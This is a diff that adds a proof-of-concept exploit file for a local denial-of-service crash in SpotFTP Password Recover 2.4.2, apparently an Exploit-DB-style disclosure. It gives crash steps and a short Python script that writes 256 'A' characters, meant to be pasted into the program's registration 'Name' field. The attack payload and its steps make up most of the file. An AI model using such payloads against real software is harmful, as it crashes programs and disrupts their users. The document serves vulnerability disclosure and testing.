@@ -1,0 +1,25 @@
+# Exploit Title: SpotFTP Password Recover 2.4.2 - 'Name' Denial of Service (PoC)
+# Discovery by: Luis Martinez
+# Discovery Date: 2019-01-04
+# Vendor Homepage: www.nsauditor.com
+# Software Link : http://www.nsauditor.com/downloads/spotftp_setup.exe
+# Tested Version: 2.4.2
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: Windows 10 Pro x64 es
+
+# Steps to Produce the Crash: 
+# 1.- Run python code : python SpotFTP_Password_Recover_2.4.2.py
+# 2.- Open SpotFTP_Password_Recover_2.4.2.txt and copy content to clipboard
+# 3.- Open SpotFTP
+# 4.- Register -> Enter Registration Code...
+# 5.- Paste ClipBoard on "Name:"
+# 6.- Key: -> L4M5
+# 7.- OK
+# 8.- Crashed
+
+#!/usr/bin/env python
+ 
+buffer = "\x41" * 256
+f = open ("SpotFTP_Password_Recover_2.4.2.txt", "w")
+f.write(buffer)
+f.close()
